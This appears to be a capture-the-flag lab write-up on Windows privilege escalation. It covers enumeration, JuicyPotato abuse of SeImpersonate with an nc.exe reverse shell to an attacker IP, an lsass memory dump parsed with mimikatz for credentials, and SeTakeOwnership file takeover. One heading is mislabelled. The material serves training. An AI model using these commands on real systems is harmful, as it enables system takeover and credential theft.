## Situational Awareness

What is the IP address of the other NIC attached to the target host?
```bash
ipconfig /all
```
![image](https://github.com/user-attachments/assets/26cdad1b-236a-473e-82ae-f41dcf8cb1b6)

What executable other than cmd.exe is blocked by AppLocker?
```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
![image](https://github.com/user-attachments/assets/96d197df-0e0b-41c9-8a1a-666803104a78)

## Initial Enumeration

What non-default privilege does the htb-student user have?

![image](https://github.com/user-attachments/assets/160484cc-3379-4ac9-b05e-c868d60fc714)

Who is a member of the Backup Operators group?

![image](https://github.com/user-attachments/assets/378109a5-9bc3-436e-8a14-44d38f2f5048)

![image](https://github.com/user-attachments/assets/7dfa0584-42a7-4864-8239-1f9da4be8983)

What service is listening on port 8080 (service name not the executable)?

![image](https://github.com/user-attachments/assets/2189cc24-c959-4bb2-bd3e-2314fa994898)

![image](https://github.com/user-attachments/assets/7de6243b-c79d-435f-bafb-18d24a061729)

What user is logged in to the target host?

![image](https://github.com/user-attachments/assets/8c88529d-7684-4b45-a2b2-8a5914d531da)

What type of session does this user have?

(Answer in above screenshot)

## Communication with Processes

What service is listening on 0.0.0.0:21? (two words)

![image](https://github.com/user-attachments/assets/33c0d126-0471-4ebd-9902-4ec45a4f8a3e)

![image](https://github.com/user-attachments/assets/d22868ff-a8c1-4a3a-9ccb-88265072aa78)

Which account has WRITE_DAC privileges over the \pipe\SQLLocal\SQLEXPRESS01 named pipe?

![image](https://github.com/user-attachments/assets/fd4ae87e-71bf-4a08-a30b-aea6980636b8)

## SeImpersonate and SeAssignPrimaryToken

Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt

Step 1 : Establish SQL Connection with mssqlclient.py

We connect to the target SQL server using mssqlclient.py with Windows authentication:
```bash
mssqlclient.py sql_dev@10.129.43.43 -windows-auth
```
Output:
```bash
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162)
```
Step 2: Enable xp_cmdshell

The xp_cmdshell stored procedure allows us to execute commands at the OS level. We enable it as follows:
```bash
SQL> enable_xp_cmdshell
```
Output:
```bash
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```
Step 3: Verify Current User Permissions

To understand our current privileges, we run:
```bash
SQL> xp_cmdshell whoami
```
Output:
```bash
nt service\mssql$sqlexpress01
```
We also check available privileges:
```bash
SQL> xp_cmdshell "whoami /priv"
```
Output:
```bash
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                     Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks             Enabled
SeCreateGlobalPrivilege       Create global objects                        Enabled
```
We have SeImpersonatePrivilege, which is exploitable using JuicyPotato.

Step 4: Launch JuicyPotato for Privilege Escalation

We use xp_cmdshell to launch a reverse shell using JuicyPotato:

```bash
SQL> xp_cmdshell "c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a \"/c c:\tools\nc.exe 10.10.14.51 4444 -e cmd.exe\" -t *"
```
Output:
```bash
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
[+] calling 0x000000000088ce08
```
We successfully escalated to NT AUTHORITY\SYSTEM and executed a reverse shell.

Step 5: Catch the Reverse Shell

On the attacker machine:
```bash
sudo nc -lnvp 4444
```
Output:
```bash
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
Step 6: Retrieve the Flag

Finally, we navigate to the Administrator's desktop and read the flag:
```bash
PS C:\Windows\system32> Get-Content c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
```

## SeDebugPrivilege

Step 1: Verify SeDebugPrivilege is available
```bash
whoami /priv
```
Output:
```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
`SeDebugPrivilege` is available but disabled. Since we have this privilege, we can debug or dump process memory, including `lsass.exe`.

Step 2: Dump the memory of lsass.exe using Procdump

```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
Output:
```bash
[22:32:24] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[22:32:25] Dump 1 writing: Estimated dump file size is 42 MB.
[22:32:25] Dump 1 complete: 42 MB written in 0.9 seconds
[22:32:26] Dump count reached.
```
We successfully dumped the memory of `lsass.exe` to a file called `lsass.dmp`

Step 3: Navigate to Mimikatz directory and launch it

```bash
cd C:\Tools\Mimikatz\x64
mimikatz.exe
```
Output:
```bash
.#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > https://blog.gentilkiwi.com/mimikatz
```

Step 4: Configure Mimikatz to use the minidump file

```bash
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

![image](https://github.com/user-attachments/assets/609b3a2d-887b-4c8b-bb74-4b21deb9efa8)


## SeDebugPrivilege

Step 1: Verify available privileges
```bash
whoami /priv
```
Output:
```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```
We have `SeTakeOwnershipPrivilege` enabled, which allows us to take ownership of objects like files and folders.

Step 2: Check the file ownership of flag.txt
```bash
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname, LastWriteTime, Attributes, @{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
Output:
```bash
FullName            LastWriteTime        Attributes Owner
--------            -------------        ---------- -----
C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM Archive    
```
The current Owner is not displayed, which means we don't own it yet.

Step 3: Verify ownership with cmd
```bash
cmd /c dir /q 'C:\TakeOwn\flag.txt'
```
Output:
```bash
 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B

 Directory of C:\TakeOwn

06/04/2021  11:24 AM                22 ...                    flag.txt
```

Step 4: Take ownership of the file using takeown
```bash
takeown /f 'C:\TakeOwn\flag.txt'
```
Output:
```bash
SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-SRV01\htb-student".
```
We are now the Owner of the file, which allows us to modify its permissions.

Step 5: Verify new ownership
```bash
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname, LastWriteTime, Attributes, @{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
Output:
```bash
FullName            LastWriteTime        Attributes Owner
--------            -------------        ---------- -----
C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM Archive    WINLPE-SRV01\htb-student
```
Ownership has successfully transferred to the htb-student user.

Step 6: Attempt to read the file
```bash
cat 'C:\TakeOwn\flag.txt'
```
Output:
```bash
cat : Access to the path 'C:\TakeOwn\flag.txt' is denied.
At line:1 char:1
+ cat 'C:\TakeOwn\flag.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\TakeOwn\flag.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```
We own the file, but we do not have the necessary permissions to read it.

Step 7: Grant full access to the current user
```bash
icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
```
Output:
```bash
processed file: C:\TakeOwn\flag.txt
Successfully processed 1 files; Failed processing 0 files
```
We have now given ourselves Full Control over the file.

Step 8: Read the contents of the flag file
```bash
cat 'C:\TakeOwn\flag.txt'
```


